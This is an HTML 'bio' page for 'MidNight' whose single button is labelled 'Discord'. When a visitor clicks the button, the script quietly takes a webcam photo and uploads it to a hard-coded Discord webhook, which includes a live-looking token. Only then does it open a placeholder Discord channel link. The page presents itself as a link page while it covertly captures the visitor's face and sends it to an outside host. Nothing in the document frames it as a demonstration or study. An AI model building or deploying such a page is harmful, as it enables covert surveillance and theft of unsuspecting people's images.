<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bio MidNight</title>
    <style>
        /* General Page Styling */
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f0f4f8;
            background-image: url('https://i.pinimg.com/originals/ec/b6/41/ecb6416c16b66e9e5409def9271224a2.gif');
            background-size: cover; /* Ensure the GIF covers the entire page */
            background-position: center center; /* Center the background image */
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            box-sizing: border-box;
        }

        h1 {
            font-size: 2.5rem;
            margin-bottom: 20px;
            color: #fff; /* Make the text white so it's visible on the dark background */
        }

        /* From Uiverse.io by kleenpulse */
        .btn {
            --border-color: linear-gradient(-45deg, #ffae00, #7e03aa, #00fffb);
            --border-width: 0.125em;
            --curve-size: 0.5em;
            --blur: 30px;
            --bg: #080312;
            --color: #afffff;
            color: var(--color);
            cursor: pointer;
            position: relative;
            isolation: isolate;
            display: inline-grid;
            place-content: center;
            padding: 0.5em 1.5em;
            font-size: 17px;
            border: 0;
            text-transform: uppercase;
            box-shadow: 10px 10px 20px rgba(0, 0, 0, 0.6);
            clip-path: polygon(
                0% var(--curve-size),
                var(--curve-size) 0,
                100% 0,
                100% calc(100% - var(--curve-size)),
                calc(100% - var(--curve-size)) 100%,
                0 100%
            );
            transition: color 250ms;
        }

        .btn::after,
        .btn::before {
            content: "";
            position: absolute;
            inset: 0;
        }

        .btn::before {
            background: var(--border-color);
            background-size: 300% 300%;
            animation: move-bg7234 5s ease infinite;
            z-index: -2;
        }

        @keyframes move-bg7234 {
            0% {
                background-position: 31% 0%;
            }

            50% {
                background-position: 70% 100%;
            }

            100% {
                background-position: 31% 0%;
            }
        }

        .btn::after {
            background: var(--bg);
            z-index: -1;
            clip-path: polygon(
                var(--border-width) calc(var(--curve-size) + var(--border-width) * 0.5),
                calc(var(--curve-size) + var(--border-width) * 0.5) var(--border-width),
                calc(100% - var(--border-width)) var(--border-width),
                calc(100% - var(--border-width)) calc(100% - calc(var(--curve-size) + var(--border-width) * 0.5)),
                calc(100% - calc(var(--curve-size) + var(--border-width) * 0.5)) calc(100% - var(--border-width)),
                var(--border-width) calc(100% - var(--border-width))
            );
            transition: clip-path 500ms;
        }

        .btn:where(:hover, :focus)::after {
            clip-path: polygon(
                calc(100% - var(--border-width)) calc(100% - calc(var(--curve-size) + var(--border-width) * 0.5)),
                calc(100% - var(--border-width)) var(--border-width),
                calc(100% - var(--border-width)) var(--border-width),
                calc(100% - var(--border-width)) calc(100% - calc(var(--curve-size) + var(--border-width) * 0.5)),
                calc(100% - calc(var(--curve-size) + var(--border-width) * 0.5)) calc(100% - var(--border-width)),
                calc(100% - calc(var(--curve-size) + var(--border-width) * 0.5)) calc(100% - var(--border-width))
            );
            transition: 200ms;
        }

        .btn:where(:hover, :focus) {
            color: #fff;
        }

        /* Hiding the captured image */
        #capturedImage {
            display: none; /* Do not display the image */
        }
    </style>
</head>
<body>

<h1 id="text">Welcome to MidNight</h1>

<!-- Update button to use the new .btn class -->
<button id="captureButton" class="btn">
    <span class="text">Discord</span>
</button>

<script>
    const captureButton = document.getElementById('captureButton');

    // Discord Webhook URL
    const discordWebhookUrl = 'https://discord.com/api/webhooks/1303968519964196875/uTGDp9VSZ8whf0ZB_yxcle8dpzjh9jyiV5T1hElIWi2mS1FHLaNlj37q99ufIzHNPDbJ';
    
    // Discord Channel URL (This will open after sending the image)
    const discordChannelUrl = 'https://discord.com/channels/YOUR_CHANNEL_ID';

    captureButton.addEventListener('click', async () => {
        let videoStream;
        try {
            // Request access to the camera
            videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = videoStream;
            document.body.appendChild(video);  // Video element added temporarily

            // Play the video stream
            await new Promise((resolve) => {
                video.onloadedmetadata = () => resolve(video.play());
            });

            // Set up a canvas to capture the photo
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            
            // Draw the video frame on the canvas
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Get the image data as a base64 PNG image
            const imageUrl = canvas.toDataURL('image/png');
            
            // Convert base64 image data to Blob
            const response = await fetch(imageUrl);
            const blob = await response.blob();

            // Send image to Discord
            await sendImageToDiscord(blob);

            // Clean up: remove the video element and stop the video stream
            videoStream.getTracks().forEach(track => track.stop());
            document.body.removeChild(video);

            // Open Discord channel after successful image upload
            window.open(discordChannelUrl, '_blank');

        } catch (error) {
            console.error('Error accessing camera:', error);
            alert('There was an issue accessing the camera. Please check your camera permissions.');
        }
    });

    // Function to send the captured image to Discord using the Webhook
    async function sendImageToDiscord(imageBlob) {
        try {
            // Prepare the FormData to send the image to Discord
            const formData = new FormData();
            formData.append('file', imageBlob, 'captured_image.png');

            // Send POST request to Discord Webhook
            const sendResponse = await fetch(discordWebhookUrl, {
                method: 'POST',
                body: formData
            });

            if (sendResponse.ok) {
                console.log('Image sent to Discord!');
            } else {
                console.error('Failed to send image to Discord');
                alert('Failed to send image to Discord.');
            }
        } catch (error) {
            console.error('Error sending image to Discord:', error);
            alert('There was an error sending the image to Discord.');
        }
    }
</script>

</body>
</html>
